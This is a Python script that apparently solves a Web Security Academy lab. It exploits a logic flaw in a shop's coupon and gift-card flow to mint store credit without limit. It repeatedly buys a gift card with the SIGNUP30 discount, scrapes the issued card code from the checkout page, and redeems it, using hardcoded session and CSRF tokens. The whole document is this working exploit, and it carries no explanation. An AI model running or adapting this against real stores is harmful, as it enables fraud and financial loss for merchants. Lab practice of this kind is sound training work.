import requests
import re

DOMAIN = "0a51009a04cbeaaf80e8e55c001900c7.web-security-academy.net"
URL = f"https://{DOMAIN}"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
}

class infinite_money:
    def __init__(self, csrf, cookies):
        self.session = requests.Session()
        self.csrf = csrf
        self.cookiejar = requests.cookies.RequestsCookieJar()
        self.cookiejar.set('session', session_cookie, domain=DOMAIN, path='/')

    def add_gift_card(self):
        data = "productId=2&redir=PRODUCT&quantity=1"
        self.session.post(f"{URL}/cart", headers=HEADERS,cookies=self.cookiejar, data=data)

    def add_coupon(self):
        data=f"csrf={self.csrf}&coupon=SIGNUP30"
        self.session.post(f"{URL}/cart/coupon", headers=HEADERS,cookies=self.cookiejar, data=data)

    def checkout_and_take_coupon(self):
        data=f"csrf={self.csrf}"
        res = self.session.post(f"{URL}/cart/checkout", headers=HEADERS,cookies=self.cookiejar, data=data)

        pattern = r'<td>([a-zA-Z0-9]+)</td>'
        matches_iterator = re.finditer(pattern, res.content.decode())
        next(matches_iterator, None)
        return next(matches_iterator, None).group(0).replace("<td>", "").replace("</td>", "")

    def add_money(self, gift_card_id):
        data=f"csrf={self.csrf}&gift-card={gift_card_id}"
        self.session.post(f"{URL}/gift-card", headers=HEADERS,cookies=self.cookiejar, data=data)

if __name__ == "__main__":
    # Change csrf, cookies and domain
    csrf= "vLGKH9gprGAXCqR5iRSa6wRiCZpFL83C"
    session_cookie = 'FssJjNrdGhE7Ff7yiGqVJoHqKz2olmOA'
    infi = infinite_money(csrf=csrf, cookies=session_cookie)
    for i in range(300):
        print(i+1)
        infi.add_gift_card()
        infi.add_coupon()
        coupon_id = infi.checkout_and_take_coupon()
        infi.add_money(coupon_id)
